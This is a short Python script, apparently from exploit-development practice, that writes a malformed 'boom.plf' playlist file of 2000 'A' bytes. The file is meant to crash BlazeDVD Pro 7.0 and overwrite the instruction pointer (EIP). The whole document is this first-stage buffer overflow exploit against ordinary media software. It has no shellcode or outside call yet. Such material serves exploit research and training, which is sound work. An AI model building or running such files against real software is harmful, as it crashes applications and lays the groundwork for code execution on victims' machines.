#!/usr/bin/env python

# author: greyshell
# file name: blazeDVDPro7.0-exploit-v1.py
# description: generates a PLF file with 2000 bytes buffer to crash the application and overwrite EIP

import sys
import os


def main():
    print ("[+] Preparing malformed boom.plf .. ")
    # overwrite EIP with 2000 bytes buffer
    buf = "A" * 2000
    filename = "boom.plf"

    if os.path.isfile(filename):
        # removing old file
        print ("[-] Found old boom.plf and removed ..")
        os.remove(filename)

    f = open(filename, 'wb')
    # f.write(buf)
    f.write(bytes(buf, "latin-1"))
    f.close()
    # print "[+] %s file created with %s bytes buffer.." % (filename, len(buf))
    print(f"[+] {filename} file created with {len(buf)} bytes buffer..")

    return


if __name__ == "__main__":
    main()
